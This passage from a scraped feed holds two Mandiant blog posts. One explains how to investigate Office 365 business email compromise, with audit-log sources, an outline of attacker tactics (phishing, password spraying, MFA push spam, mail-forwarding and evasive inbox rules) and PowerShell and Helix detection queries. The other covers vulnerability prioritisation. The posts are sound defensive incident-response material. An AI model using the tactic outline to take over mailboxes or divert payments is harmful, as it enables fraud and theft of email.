parameter.</p> \n<p>At the time of writing this post, Microsoft has recently <a href=\"https://docs.microsoft.com/en-us/microsoft-365/compliance/advanced-audit?view=o365-worldwide\">released information</a> about enhanced auditing functionality that gives investigators insight into which emails were accessed by attackers. This level of logging for regular user accounts is only available for organizations with an Office 365 E5 subscription. Once Advanced Auditing is enabled, mail access activity will be logged under the <i>MailItemsAccessed</i> operation in both the UAL and MAL.</p> \n<p> <b>Administrator Audit Log</b></p> \n<p>If the <i>Audit Log Search</i> feature is enabled, this supplemental data source logs all PowerShell administrative cmdlets (including command-line arguments) executed by administrators. If you suspect that an administrator account was compromised, don’t overlook this log! The PowerShell cmdlet <b> <i>Search-AdminAuditLog</i></b> is used to query these logs, but note that the <i>Audit Log Search</i> feature must be enabled and the same 90 day retention limit will be in place.</p> \n<p> <b>Azure AD Logs</b></p> \n<p>Azure AD logs can be accessed from the Azure portal (<a href=\"https://portal.azure.com/\">portal.azure.com</a>) under the Azure Active Directory service. Azure AD Sign-in logs contain detailed information about how authentications occur and O365 application usage. Azure AD audit logs are also a valuable source of information, containing records of password resets, account creations, role modifications, OAuth grants, and more that could be indicative of suspicious activity. Note that Azure AD logs are only available for 30 days.</p> \n<p> <b>Cloud App Security Portal</b></p> \n<p>For cases where OAuth abuse has been observed, information about cloud applications can be found in Microsoft’s Cloud App Security portal (<a href=\"https://portal.cloudappsecurity.com/\">portal.cloudappsecurity.com</a>). Access to this portal requires an E5 license or a standalone Cloud App license. For more background on OAuth abuse, be sure to check out our blog post:&nbsp;<i> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2018/05/shining-a-light-on-oauth-abuse-with-pwnauth.html\">Shining a Light on OAuth Abuse with PwnAuth</a></i>.</p> \n<p> <b>Message Traces</b></p> \n<p>Message traces record the emails sent and received by a user. During an investigation, run reports on any email addresses of interest. The message trace report will contain detailed mail flow information as well as subject lines, original client IP addresses, and message sizes. Message traces are useful for identifying emails sent by attackers from compromised accounts, and can also aid in identifying initial phishing emails if phishing was used for initial access. To obtain the actual emails, use the Content Search tool.</p> \n<p>Only the past 10 days of activity is available with the <b>Get-MessageTrace</b> PowerShell cmdlet. Historical searches for older messages can be run with the <b>Get-HistoricalSearch</b> cmdlet (up to 90 days by default), but historical searches typically take hours for the report to be available. Historical reports can also be generated within the Security and Compliance Center.</p> \n<p> <b>eDiscovery Content Searches</b></p> \n<p>The Content Search tool allows investigators to query for emails, documents, and instant message conversations stored in an Office 365 tenant. We frequently run Content Search queries to find and acquire copies of emails sent by attackers. Content searches are limited to what has been indexed by Microsoft, so recent activity may not immediately appear. Additionally, only the most recent 1000 items will be shown in the preview pane.</p> \n<h4>Anatomy of an O365 BEC</h4> \n<p>As mentioned earlier, BECs are one of the more prevalent threats to O365 tenants seen by Managed Defense today. Sometimes, Mandiant analysts respond to several BEC cases at our customers within the same week. With this frontline experience, we’ve compiled a list of commonly observed tactics and techniques to advise our readers about the types of activities one should anticipate. Please note that this is by no means a comprehensive list of O365 attacks, rather a focus on the usual routes we’ve seen BEC actors take to accomplish their objective.</p> \n<p> <b>Phase 1: Initial Compromise</b></p> \n<ul> \n <li> <u>Phishing</u>: Emails with links to credential harvesting forms sent to victims, sometimes from the account of a compromised business partner.</li> \n <li> <u>Brute force</u>: A large dictionary of passwords attempted against an account of interest.</li> \n <li> <u>Password spray</u>: A dictionary of commonly used passwords attempted against a list of known user accounts.</li> \n <li> <u>Access to credential dump</u>: Valid credentials used from a previous compromise of the user.</li> \n <li> <u>MFA bypasses</u>: Use of mail clients leveraging legacy authentication protocols (e.g. IMAP/POP), which bypass MFA policies. Attackers may also spam push notifications to the victim by repeatedly attempting to log in, eventually leading to the victim mistakenly accepting the prompt.</li> \n</ul> \n<p> <b>Phase 2: Establish Foothold</b></p> \n<ul> \n <li> <u>More phishing</u>: Additional phishing lures sent to internal/external contacts from Outlook’s global address list.</li> \n <li> <u>More credible lures</u>: New phishing lures uploaded to the compromised user's OneDrive or SharePoint account and shared with the victim’s coworkers.</li> \n <li> <u>SMTP forwarding</u>: SMTP forwarding enabled in the victim’s mailbox to forward all email to an external address.</li> \n <li> <u>Forwarding mailbox rules</u>: Mailbox rules created to forward all or certain mail to an external address.</li> \n <li> <u>Mail client usage</u>: Outlook or third-party mail clients used by attackers. Mail will continue to sync for a short while after a password reset occurs.</li> \n</ul> \n<p> <b>Phase 3: Evasion</b></p> \n<ul> \n <li> <u>Evasive mailbox rules</u>: Mailbox rules created to delete mail or move some or all incoming mail to uncommonly used folders in Outlook, such as “RSS Subscriptions”.</li> \n <li> <u>Manual evasion</u>: Manual deletion of incoming and sent mail. Attackers may forego mailbox rules entirely.</li> \n <li> <u>Mail forwarding</u>: Attackers accessing emails without logging in if a mechanism to forward mail to an external address was set up earlier.</li> \n <li> <u>Mail client usage</u>: Outlook or third-party mail clients used by attackers. Mail can be synced locally to the attacker’s machine and accessed later.</li> \n <li> <u>VPN usage</u>: VPN servers, sometimes with similar geolocations to their victims, used in an attempt to avoid detection and evade conditional access policies.</li> \n</ul> \n<p> <b>Phase 4: Internal Reconnaissance</b></p> \n<ul> \n <li> <u>Outlook searching</u>: The victim’s mailbox queried by attackers for emails of interest. While not recorded in audit logs, it may be available to <a href=\"https://support.office.com/en-us/article/delete-search-history-or-export-search-history-in-outlook-on-the-web-582647f4-fae8-46ed-9f78-49b919ddfc69\">export</a> if it was not deleted by attackers.</li> \n <li> <u>O365 searching</u>: Searches conducted within SharePoint and other O365 applications for content of interest. While not recorded in audit logs, SharePoint and OneDrive file interactions are recorded in the UAL.</li> \n <li> <u>Mail client usage</u>: Outlook or third-party mail clients used by attackers. Mail can be synced locally to the attacker’s machine and accessed later.</li> \n</ul> \n<p> <b>Phase 5: Complete Mission</b></p> \n<ul> \n <li> <u>Direct deposit update</u>: A request sent to the HR department to update the victim’s direct deposit information, redirecting payment to the BEC actor.</li> \n <li> <u>W-2 scam</u>: A request sent to the HR department for W-2 forms, used to harvest PII for tax fraud.</li> \n <li> <u>Wire transfer</u>: A wire transfer requested for an unpaid invoice, upcoming M&amp;A, charities, etc.</li> \n <li> <u>Third-party account abuse</u>: Abuse of the compromised user’s privileged access to third-party accounts and services, such as access to a corporate rewards site.</li> \n</ul> \n<h4>How Managed Defense Responds to O365 BECs</h4> \n<p>In this section, we’re going to walk through how Managed Defense investigates a typical O365 BEC case.</p> \n<p>Many of the steps in our investigation rely on querying for logs with PowerShell. To do this, first establish a remote PowerShell session to Exchange Online. The following Microsoft documentation provides guidance on two methods to do this:</p> \n<ul> \n <li> <a href=\"https://docs.microsoft.com/en-us/powershell/exchange/exchange-online/connect-to-exchange-online-powershell/connect-to-exchange-online-powershell\">Connect to Exchange Online PowerShell with Basic authentication</a></li> \n <li> <a href=\"https://docs.microsoft.com/en-us/powershell/exchange/exchange-online-powershell-v2\">Use the Exchange Online PowerShell with modern authentication using V2 module</a></li> \n</ul> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/obscured/Picture1.png\" alt=\"\" /></p> \n<p> <b>Broad Scoping</b></p> \n<p>We start our investigations off by running broad queries against the Unified Audit Log (UAL) for suspicious activity. We’ll review OAuth activity too, which is especially important if something more nefarious than a financially motivated BEC is suspected. Any FireEye gear available to us—such as FireEye <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/products/helix.html\">Helix</a> and <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/products/email-security.html\">Email Security</a>—will be leveraged to augment the data available to us from Office 365.&nbsp;</p> \n<p>The following are a few initial scoping queries we’d typically run at the beginning of a Managed Defense engagement.</p> \n<p> <i>Scoping Recent Mailbox Rule Activity</i></p> \n<p>Even in large tenants, pulling back all recent mailbox rule activity doesn’t typically produce an unmanageable number of results, and attacker-created rules tend to stand out from the rest of the noise.</p> \n<p>Querying UAL for all mailbox rule activity in Helix:</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">class=ms_office365 action:[New-InboxRule, Set-InboxRule, Enable-InboxRule] | table [createdtime, action, username, srcipv4, srcregion, parameters, rawmsg]</span></td> \n  </tr>\n </tbody>\n</table> \n<p>Query UAL for new mail rule activity in PowerShell:</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-90) -EndDate (Get-Date) -ResultSize 5000 -Operations \"New-InboxRule\",\"Set-InboxRule\",\"Enable-InboxRule\" | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8</span></td> \n  </tr>\n </tbody>\n</table> \n<p> <i>Scoping SMTP Forwarding Activity</i></p> \n<p>SMTP forwarding is sometimes overlooked because it appears under a UAL operation separate from mailbox rules. This query looks for the <b>Set-Mailbox</b> operation containing a parameter to forward mail over SMTP, indicative of <a href=\"https://support.office.com/en-us/article/turn-on-automatic-forwarding-in-outlook-on-the-web-7f2670a1-7fff-4475-8a3c-5822d63b0c8e\">automatic forwarding</a> being enabled from OWA.</p> \n<p>Querying UAL for SMTP forwarding in Helix:</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">class=ms_office365 action=Set-Mailbox rawmsg:ForwardingSmtpAddress | table [createdtime, action, username, srcipv4, srcregion, parameters, rawmsg]</span></td> \n  </tr>\n </tbody>\n</table> \n<p>Querying UAL for SMTP forwarding in PowerShell:</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-90) -EndDate (Get-Date) -ResultSize 5000 -FreeText \"ForwardingSmtpAddress\" | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8</span></td> \n  </tr>\n </tbody>\n</table> \n<p> <b>Analyze Compromised Users Logs</b></p> \n<p>After we’ve finished scoping the tenant, we’ll turn our attention to the individual users believed to be involved in the compromise. We’ll acquire all relevant O365 logs for the identified compromised user(s) - this includes the user's UAL, Mailbox Audit Log (MAL), and Admin audit log (if the user is an administrator). We’ll review these logs for anomalous account activity and assemble a list of attacker IP addresses and User-Agents strings. We’ll use this list to further scope the tenant.</p> \n<p>O365 investigations rely heavily on anomaly detection. Many times, the BEC actor may even be active at the same time as the user. In order to accurately differentiate between legitimate user activity and attacker activity within a compromised account, it's recommended to pull back as much data as possible to use as a reference for legitimate activity. Using the Helix query transforms <b> <i>groupby &lt; [srccountry,srcregion]</i></b>,<b> <i>groupby &lt; useragent</i></b> <i> </i>and<i> </i> <b> <i>groupby &lt; srcipv4</i></b> <i>,<b> </b></i>which highlight the least common geolocations, User Agent strings, and IP addresses, can also assist in identifying anomalies in results.</p> \n<p>Querying UAL for a user in Helix:</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">class=ms_office365 username=user@client.com | table [createdtime, action, username, srcipv4, srccountry, srcregion, useragent, rawmsg] | groupby &lt; [srccountry,srcregion]</span></td> \n  </tr>\n </tbody>\n</table> \n<p>Querying UAL for a user in PowerShell:</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">Search-UnifiedAuditLog -StartDate mm/dd/yyyy -EndDate (Get-Date) -ResultSize 5000 -UserIds user@client.com | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8</span></td> \n  </tr>\n </tbody>\n</table> \n<p>Querying MAL for a user in PowerShell:</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">Search-MailboxAuditLog -Identity user@client.com -LogonTypes Owner,Delegate,Admin -ShowDetails -StartDate (Get-Date).AddDays(-90) -EndDate (Get-Date) | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8</span></td> \n  </tr>\n </tbody>\n</table> \n<p>Querying Admin Audit Log for all events within a certain date in PowerShell:</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">Search-AdminAuditLog -StartDate mm/dd/yyyy -EndDate mm/dd/yyyy | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8</span></td> \n  </tr>\n </tbody>\n</table> \n<p> <b>Query UAL with New Leads</b></p> \n<p>Now that we’ve built a list of suspicious IP addresses (or even entire CIDR ranges) and User-Agent strings, we’ll run new queries against the entire UAL to try to identify other compromised user accounts. <i>We’ll repeat this step and the previous step for each newly identified user account.</i></p> \n<p>One advantage to using FireEye Helix platform over PowerShell is that we can query entire CIDR ranges. This is helpful when we observe attackers coming from a VPN or ISP that dynamically assigns IP addresses within the same address block.</p> \n<p>Queries for attacker User-Agent strings usually generate more noise to sift through than IP address searches. In practice, User-Agent queries are only beneficial if the attackers are using an uncommon browser or version of a browser. Due to limitations of the <b>Search-UnifiedAuditLog</b> cmdlet, we’ve had the most success using the FreeText parameter and searching for simple strings.</p> \n<p>In Helix:</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">class=ms_office365 (srcipv4:[1.2.3.4, 2.3.4.0/24] OR useragent:Opera) | table [createdtime, action, username, srcipv4, srccountry, srcregion, useragent, rawmsg] | groupby username</span></td> \n  </tr>\n </tbody>\n</table> \n<p>Querying the UAL for IPs and user agents in PowerShell:</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">Search-UnifiedAuditLog -StartDate mm/dd/yyyy -EndDate (Get-Date) -ResultSize 5000 -IPAddresses 1.2.3.4, 2.3.4.5 | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8</span></td> \n  </tr>\n </tbody>\n</table> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">Search-UnifiedAuditLog -StartDate mm/dd/yyyy -EndDate (Get-Date) -ResultSize 5000 -FreeText \"Opera\" | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8</span></td> \n  </tr>\n </tbody>\n</table> \n<p> <b>Analyze Message Traces</b></p> \n<p>We’ll use PowerShell to query message traces for the compromised users we’ve identified. If the email was sent within the past 10 days, use the <b>Get-MessageTrace</b> cmdlet, which immediately returns results and allows teams to query IP addresses. For older emails, use the <b>Start-HistoricalSearch</b> cmdlet and download the report later from the Mail Flow section of the Security &amp; Compliance center.</p> \n<p>Querying for the last 10 days of mail sent by the victim in PowerShell:</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">Get-MessageTrace -StartDate (Get-Date).AddDays(-10) -EndDate (Get-Date) -SenderAddress victim@client.com | Select-Object Received, SenderAddress, RecipientAddress, Subject, Status, FromIP, Size, MessageID | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8</span></td> \n  </tr>\n </tbody>\n</table> \n<p>Querying for older emails (up to 90 days) in PowerShell:</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">Start-HistoricalSearch -ReportTitle \"Mandiant O365 investigation\" -StartDate mm/dd/yyyy -EndDate mm/dd/yyyy -ReportType MessageTraceDetail -SenderAddress victim@client.com</span></td> \n  </tr>\n </tbody>\n</table> \n<p>As Message Trace results are reviewed, attention should be given to IP addresses to determine which emails were sent by attackers. If phishing was the suspected initial compromise vector, it’s a good idea to also query for incoming mail received within a few days prior to the first compromise date and look for suspicious sender addresses and/or subject lines.</p> \n<p> <b>Acquire Emails of Interest</b></p> \n<p>With our list of suspicious emails identified from message traces, we’ll use the Content Search tool available in the Office 365 Security and Compliance Center acquire the email body and learn what domains were used in phishing lures (if phishing was present). Content Searches are performed by using a straightforward GUI, and the results can either be previewed in the browser, downloaded individually as EML files, or downloaded in bulk as PST files.</p> \n<p> <b>Final Scoping</b></p> \n<p>At this point of our investigation, the BEC should be sufficiently scoped within the tenant. To ensure any follow-on activity hasn’t occurred, we’ll take all of the attack indicators and perform our final queries across the UAL.</p> \n<p>With that said, there are still edge cases in which attacker activity wouldn’t appear in O365 logs. For example, perhaps an additional user has submitted their credentials to a phishing page, but the attackers haven’t used them to log in yet. To ensure we don’t miss this activity, we’ll perform additional scoping across available network logs, specifically for IP addresses and domains related to the attacker’s phishing infrastructure. We’ll also leverage other FireEye products, such as the Endpoint Security platform, to search for phishing domains present on a host’s web browser history.</p> \n<h4>Conclusion</h4> \n<p>Unauthorized access to O365 tenant doesn’t just pose a threat to an organization, but also to its staff and business partners. Organizations without enhanced security controls in O365 are at the greatest risk of experiencing a BEC. However, as multi factor-authentication becomes more and more commonplace, we’ve witnessed an increase of MFA bypass attempts performed by increasingly proficient attackers.</p> \n<p>It’s important to remember that social engineering plays a primary role throughout a BEC. Ensure that users are trained on how to identify credential harvesting forms, a common compromise vector. When in the midst of a BEC compromise, teams may want to promptly alert personnel in HR and finance-related roles to exercise extra caution when processing requests related to banking or wire transfers while the investigation is in progress.</p> \n<p>The examples covered in this blog post are just a sample of what Managed Defense performs while investigating an Office 365 compromise. To take a proactive approach at preventing BECs, make sure the following best practices are implemented in a O365 tenant. Additionally, FireEye Email Security offers protections against phishing and the Helix platform’s O365 ruleset can alert on anomalous activity as soon as it happens.</p> \n<h4>Recommended Best Practices</h4> \n<ul> \n <li>Ensure mailbox audit logging is enabled on all accounts</li> \n <li>Disable Legacy Authentication protocols</li> \n <li>Enable multi-factor authentication (MFA)</li> \n <li>Enforce strong passwords and a password expiration policy</li> \n <li>Forward O365 audit logs to a centralized logging platform for extended retention</li> \n <li>Enforce an account lockout policy in Azure/on-premise Active Directory</li> \n <li>Restrict mail forwarding to external domains</li> \n</ul> \n<h4>Acknowledgements</h4> \n<p>Special thanks to Doug Bienstock, Glenn Edwards, Josh Madeley, and Tim Martin for their research and assistance on the topic.</p>","descriptionType":"html","publishedDate":"Thu, 30 Jul 2020 19:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/obscured/Picture1.png","linkMd5":"3b0f0c23c6b7bf63aa228d81df812e7c","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn95@2020_5/2020/08/24/14-11-05-297_8f489f26e3a615c5.webp","destWidth":1650,"destHeight":384,"sourceBytes":157436,"destBytes":44600,"author":"Joseph Hladik","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/obscured/Picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn95@2020_5/2020/08/24/14-11-05-297_8f489f26e3a615c5.webp"},"publishedOrCreatedDate":1598278264215},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Putting the Model to Work: Enabling Defenders With Vulnerability\nIntelligence — Intelligence for Vulnerability Management, Part Four","link":"http://www.fireeye.com/blog/threat-research/2020/04/enabling-defenders-with-vulnerability-intelligence.html","description":"<p> <i>One of the critical strategic and tactical roles that cyber threat intelligence (CTI) plays is in the tracking, analysis, and prioritization of software vulnerabilities that could potentially put an organization’s data, employees and customers at risk. In this four-part blog series, FireEye Mandiant Threat Intelligence highlights the value of CTI in enabling vulnerability management, and unveils new research into the latest threats, trends and recommendations.</i></p> \n<p>Organizations often have to make difficult choices when it comes to patch prioritization. Many are faced with securing complex network infrastructure with thousands of systems, different operating systems, and disparate geographical locations. Even when armed with a simplified <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/04/how-mandiant-intelligence-rates-vulnerabilities.html\">vulnerability rating system</a>, it can be hard to know where to start. This problem is compounded by the ever-changing threat landscape and <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/04/zero-day-exploitation-demonstrates-access-to-money-not-skill.html\">increased access to zero-days</a>.</p> \n<p>At FireEye, we apply the rich body of knowledge accumulated over years of global intelligence collection, incident response investigations, and device detections, to help our customers defend their networks. This understanding helps us to discern between hundreds of newly disclosed vulnerabilities to provide ratings and assessments that empower network defenders to focus on the most significant threats and effectively mitigate risk to their organizations.&nbsp;</p> \n<p>In this blog post, we’ll demonstrate how we apply intelligence to help organizations assess risk and make informed decisions about vulnerability management and patching in their environments.</p> \n<h4>Functions of Vulnerability Intelligence</h4> \n<p>Vulnerability intelligence helps clients to protect their organizations, assets, and users in three main ways:</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnintel/Picture1.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 1: Vulnerability intelligence can help with risk assessment and informed decision making</span></p> \n<h4>Tailoring Vulnerability Prioritization</h4> \n<p>We believe it is important for organizations to build a defensive strategy that prioritizes the types of threats that are most likely to impact their environment, and the threats that could cause the most damage. When organizations have a clear picture of the spectrum of threat actors, malware families, campaigns, and tactics that are most relevant to their organization, they can make more nuanced prioritization decisions when those threats are linked to exploitation of vulnerabilities. A lower risk vulnerability that is actively being exploited in the wild against your organization or similar organizations likely has a greater potential impact to you than a vulnerability with a higher rating that is not actively being exploited.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnintel/Picture2.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 2: Patch Prioritization Philosophy</span></p> \n<h4>Integration of Vulnerability Intelligence in Internal Workflows</h4> \n<p>Based on our experience assisting organizations globally with enacting intelligence-led security, we outline three use cases for integrating vulnerability intelligence into internal workflows.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnintel/Picture3.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 3: Integration of vulnerability intelligence into internal workflows</span></p> \n<p> <b>Tools and Use Cases for Operationalizing Vulnerability Intelligence</b></p> \n<p> <i>1. Automate Processes by Fusing Intelligence with Internal Data</i></p> \n<p>Automation is valuable to security teams with limited resources.&nbsp;Similar to&nbsp;automated detecting and blocking of indicator data, vulnerability threat intelligence can be automated by merging data from internal vulnerability scans with threat intelligence (via systems like the Mandiant <a href=\"https://www.fireeye.com/solutions/cyber-threat-intelligence/threat-intelligence-subscriptions/intelligence-api.html\">Intelligence API</a>) and&nbsp;aggregated&nbsp;into&nbsp;a SIEM, Threat Intelligence Platform, and/or ticketing system. This enhances visibility into various sources of both internal and external data with vulnerability intelligence providing risk ratings and indicating which&nbsp;vulnerabilities&nbsp;are being actively exploited. FireEye also offers a custom tool called FireEye Intelligence Vulnerability Explorer (“FIVE”), described in more detail below for quickly correlating vulnerabilities found in logs and scans with Mandiant ratings.</p> \n<p>Security teams can similarly automate communication and workflow tracking processes using threat intelligence by defining rules for auto-generating tickets based on certain combinations of Mandiant risk and exploitation ratings; for example, internal&nbsp;service-level-agreements (SLAs)&nbsp;could state that ‘high’ risk vulnerabilities&nbsp;that have an exploitation rating of ‘available,’ ‘confirmed,’ or ‘wide’ must be patched within a set number of&nbsp;days. Of course,&nbsp;the SLA will depend on the company’s operational needs, the capability of the team that is advising the patch process, and executive buy-in to the SLA process.&nbsp;Similarly, there may be an SLA defined for patching vulnerabilities that are of a certain age.&nbsp;Threat intelligence tells us that adversaries continue to use older vulnerabilities as long as they remain effective. For example, as recently as January 2020, we observed a Chinese cyber espionage group use an exploit for CVE-2012-0158, a Microsoft Office stack-based buffer overflow vulnerability originally released in 2012, in malicious email attachments to target organizations in Southeast Asia.&nbsp;Automating the&nbsp;vulnerability-scan-to-vulnerability-intelligence correlation&nbsp;process can&nbsp;help bring this type of issue to light.&nbsp;</p> \n<p>Another potential use case employing automation would be incorporating vulnerability intelligence as security teams are testing updates or new hardware and software prior to introduction into the production environment.&nbsp;This could&nbsp;dramatically reduce the number of vulnerabilities&nbsp;that need to be patched in production and help prioritize those&nbsp;vulnerabilities&nbsp;that need to be patched first based on your organization’s unique threat profile and business operations.</p> \n<p> <i>2. Communicating with Internal Stakeholders</i></p> \n<p>Teams can leverage vulnerability reporting to send internal messaging, such as flash-style notifications, to alert other teams when Mandiant rates a vulnerability known to impact your systems high or critical. These are the vulnerabilities that should take priority in patching and should be patched outside of the regular cycle.</p> \n<p>Data-informed intelligence analysis may help convince stakeholders outside of the security organization the importance of patching quickly, even when this is inconvenient to business operations. Threat Intelligence can inform an organization’s appropriate use of resources for security given the potential business impact of security incidents.</p> \n<p> <i>3. Threat Modeling</i></p> \n<p>Organizations can leverage vulnerability threat intelligence to inform their threat modeling to gain insight into the most likely threats to their organization, and better prepare to address threats in the mid to long term. Knowledge of which adversaries pose the greatest threat to your organization, and then knowledge of which vulnerabilities those threat groups are exploiting in their operations, can enable your organization to build out security controls and monitoring based on those specific CVEs.</p> \n<h4>Examples</h4> \n<p>The following examples illustrate workflows supported by vulnerability threat intelligence to demonstrate how organizations can operationalize threat intelligence in their existing security teams to automate processes and increase efficiency given limited resources.</p> \n<p> <i>Example 1: Using FIVE for Ad-hoc Vulnerability Prioritization</i></p> \n<p>The FireEye Intelligence Vulnerability Explorer (“FIVE”) tool is available for customers <a href=\"https://fireeye.market/apps?query=five\">here</a>. It is available for MacOS and Windows, requires a valid subscription for Mandiant Vulnerability Intelligence, and is driven from an API integration.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnintel/Picture4.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 4: FIVE Tool for Windows and MacOS</span></p> \n<p>In this scenario, an organization’s intelligence team was asked to quickly identify any vulnerability that required patching from a server vulnerability scan after that server was rebuilt from a backup image. The intelligence team was presented with a text file containing a list of CVE numbers. Users can drag-and-drop a text readable file (CSV, TEXT, JSON, etc.) into the FIVE tool and the CVE numbers will be discovered from the file using regex. As shown in Figure 6 (below), in this example, the following vulnerabilities were found in the file and presented to the user.&nbsp;</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnintel/Picture5.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 5: FIVE tool startup screen waiting for file input</span></p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnintel/Picture6.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 6: FIVE tool after successfully regexing the CVE-IDs from the file</span></p> \n<p>After selecting all CVE-IDs, the user clicked the “Fetch Vulnerabilities” button, causing the application to make the necessary two-stage API call to the Intelligence API.</p> \n<p>The output depicted in Figure 7 shows the user which vulnerabilities should be prioritized based on FireEye’s risk and exploitation ratings. The red and maroon boxes indicate vulnerabilities that require attention, while the yellow indicate vulnerabilities that should be reviewed for possible action. Details of the vulnerabilities are displayed below, with associated intelligence report links providing further context.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/vulnintel/Picture7.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 7: FIVE tool with meta-data, CVE-IDs, and links to related Intelligence Reports</span></p> \n<p>FIVE can also facilitate other use cases for vulnerability intelligence. For example, this chart can be attached in messaging to other internal stakeholders or executives for review, as part of a status update to provide visibility on the organization’s vulnerability management program.</p> \n<p> <i>Example 2: Vulnerability Prioritization, Internal Communications, Threat Modeling</i></p> \n<p>CVE-2019-19781 is a vulnerability affecting Citrix that Mandiant Threat Intelligence rated critical. Mandiant discussed early <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/products-and-services/2020/01/rough-patch-promise-it-will-be-200-ok.html\">exploitation of this vulnerability</a> in a January 2020 blog post. We continued to monitor for additional exploitation, and informed our clients when we observed exploitation by ransomware operators and Chinese espionage group, <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html\">APT41</a>.</p> \n<p>In cases like these, threat intelligence can help impacted organizations find the “signal” in the “noise” and prioritize patching using knowledge of exploitation and the motives and targeting patterns of threat actors behind the exploitation. Enterprises can use intelligence to inform internal stakeholders of the potential risk and provide context as to the potential business and financial impact of a ransomware infection or an intrusion by a highly resourced state sponsored group. This support the immediate patch prioritization decision while simultaneously emphasizing the value of a holistically informed security organization.</p> \n<p> <i>Example 3: Intelligence Reduces Unnecessary Resource Expenditure — Automating Vulnerability Prioritization and Communications</i></p> \n<p>Another common application for vulnerability intelligence is informing security teams and stakeholders when to stand down. When a vulnerability is reported in the media, organizations often spin up resources to patch as quickly as possible. Leveraging threat intelligence in security processes help an organization discern when it is necessary to respond in an all-hands-on-deck manner.</p> \n<p>Take the case of the <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12650\">CVE-2019-12650</a>, originally disclosed on Sept. 25, 2019 with an NVD rating of “High.” Without further information, an organization relying on this score to determine prioritization may include this vulnerability in the same patch cycle along with numerous other vulnerabilities rated High or Critical. As previously discussed, we have experts <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/04/how-mandiant-intelligence-rates-vulnerabilities.html\">review the vulnerability and determine</a> that it required the highest level of privileges available to successfully exploit, and there was no evidence of exploitation in the wild.</p> \n<p>This is a case where threat intelligence reporting as well as automation can effectively minimize the need to unnecessarily spin up resources. Although the public NVD score rated this vulnerability high, Mandiant Intelligence rated it as “low” risk due to the high level of privileges needed to use it and lack of exploitation in the wild. Based on this assessment, organizations may decide that this vulnerability could be patched in the regular cycle and does not necessitate use of additional resources to patch out-of-band. When Mandiant ratings are automatically integrated into the patching ticket generation process, this can support efficient prioritization. Furthermore, an organization could use the analysis to issue an internal communication informing stakeholders of the reasoning behind lowering the prioritization.</p> \n<h4>Vulnerabilities: Managed</h4> \n<p>Because we have been closely monitoring vulnerability exploitation trends for 